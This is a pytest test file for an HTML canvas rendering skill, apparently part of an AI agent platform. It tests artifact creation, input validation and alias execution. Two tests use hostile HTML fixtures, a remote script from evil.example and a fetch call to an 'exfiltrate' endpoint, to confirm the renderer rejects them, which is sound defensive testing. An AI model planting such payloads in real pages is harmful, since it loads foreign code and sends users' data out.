from __future__ import annotations

import asyncio
from pathlib import Path

import boto3
import pytest
import yaml

from src.skills.html_canvas.actions import render_canvas
from src.skills.html_canvas.models import MAX_CANVAS_HTML_BYTES, RenderCanvasRequest
from src.skills.registry import SkillRegistry
from tests.mock_data import TEST_USER_EMAIL


def _create_media_bucket(bucket_name: str = "innomightlabs-conversations-meta") -> None:
    boto3.client("s3", region_name="us-east-1").create_bucket(Bucket=bucket_name)


def _context() -> dict:
    return {
        "owner_email": TEST_USER_EMAIL,
        "agent_id": "agent-1",
        "conversation_id": "conversation-1",
        "user_message_id": "message-1",
    }


def _self_contained_html() -> str:
    return "<html><body><canvas id='c'></canvas><script>console.log('chart')</script></body></html>"


def test_html_canvas_manifest_declares_action_and_aliases():
    with open("src/skills/html_canvas/manifest.yml") as handle:
        manifest = yaml.safe_load(handle)

    action = manifest["actions"][0]

    assert manifest["id"] == "html_canvas"
    assert manifest["namespace"] == "content.canvas"
    assert action["name"] == "render_canvas"
    assert {"create_canvas", "save_canvas", "render_html"}.issubset(set(action["aliases"]))


def test_render_canvas_creates_canvas_artifact(dynamodb_table, monkeypatch):
    _create_media_bucket()
    monkeypatch.setattr("src.artifacts.storage.settings.conversation_media_bucket", "innomightlabs-conversations-meta")

    result = render_canvas(
        {"title": "Revenue by Region", "caption": "Q1", "html": _self_contained_html()},
        {},
        _context(),
    )

    assert result["ok"] is True
    assert result["type"] == "canvas_artifact"
    assert result["mime_type"] == "text/html"
    assert result["caption"] == "Q1"
    assert result["view_url"]

    from src.artifacts.service import ArtifactService

    stored = ArtifactService().repository.find_by_id(TEST_USER_EMAIL, result["artifact_id"])
    assert stored is not None
    assert stored.artifact_type == "canvas"
    assert stored.source.skill_id == "html_canvas"
    assert stored.source.agent_id == "agent-1"
    assert stored.source.conversation_id == "conversation-1"
    assert stored.source.message_id == "message-1"
    assert stored.source.metadata == {"caption": "Q1"}


def test_render_canvas_rejects_external_script_reference():
    result = render_canvas(
        {"title": "Bad", "html": "<html><script src=\"http://evil.example/x.js\"></script></html>"},
        {},
        _context(),
    )

    assert result["ok"] is False
    assert "external" in result["message"]


def test_render_canvas_rejects_external_fetch_call():
    result = render_canvas(
        {"title": "Bad", "html": "<script>fetch('https://evil.example/exfiltrate')</script>"},
        {},
        _context(),
    )

    assert result["ok"] is False
    assert "external" in result["message"]


def test_render_canvas_request_rejects_blank_title_and_html():
    with pytest.raises(ValueError, match="title is required"):
        RenderCanvasRequest.model_validate({"title": "   ", "html": _self_contained_html()})

    with pytest.raises(ValueError, match="html is required"):
        RenderCanvasRequest.model_validate({"title": "Chart", "html": "   "})


def test_render_canvas_request_rejects_oversized_html():
    with pytest.raises(ValueError, match="6 MB"):
        RenderCanvasRequest.model_validate({"title": "Chart", "html": "a" * (MAX_CANVAS_HTML_BYTES + 1)})


def test_html_canvas_registry_alias_executes(dynamodb_table, monkeypatch):
    _create_media_bucket()
    monkeypatch.setattr("src.artifacts.storage.settings.conversation_media_bucket", "innomightlabs-conversations-meta")
    registry = SkillRegistry(Path("src/skills"))

    result = asyncio.run(
        registry.execute_action(
            "html_canvas",
            "create_canvas",
            {"title": "Chart", "html": _self_contained_html()},
            {},
            _context(),
        )
    )

    assert result["ok"] is True
    assert result["type"] == "canvas_artifact"
